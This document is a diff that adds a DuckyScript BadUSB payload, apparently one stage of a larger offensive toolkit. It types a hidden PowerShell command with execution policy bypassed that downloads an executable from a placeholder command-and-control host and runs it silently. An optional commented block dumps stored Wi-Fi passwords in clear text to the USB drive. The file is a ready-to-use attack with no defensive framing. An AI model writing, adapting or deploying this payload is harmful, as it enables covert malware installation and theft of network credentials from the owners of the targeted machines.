@@ -1,0 +1,30 @@
+REM ============================================================================
+REM 🍯 Zencefil Efendi's BadUSB Payload (DuckyScript)
+REM Description: Executes a hidden PowerShell, bypasses Execution Policy, 
+REM              downloads the Nim Loader (Phase 9), and executes it silently.
+REM Target: Windows 10/11 (Unlocked Screen)
+REM ============================================================================
+
+REM Wait for the USB to initialize as a keyboard
+DELAY 1000
+
+REM Open the Run Dialog (Windows Key + R)
+GUI r
+DELAY 300
+
+REM Type the command to open a hidden PowerShell window
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://YOUR_C2_IP/zencefil_runner.exe' -OutFile '$env:TEMP\z.exe'; Start-Process -FilePath '$env:TEMP\z.exe'"
+DELAY 200
+
+REM Press Enter to execute
+ENTER
+
+REM ============================================================================
+REM Optional: If you want to steal Wi-Fi passwords and save them to the USB
+REM Un-comment the lines below (assuming the USB volume is D:)
+REM ============================================================================
+REM GUI r
+REM DELAY 300
+REM STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "netsh wlan show profile name=* key=clear | Out-File -FilePath 'D:\wifi_loot.txt'"
+REM DELAY 200
+REM ENTER
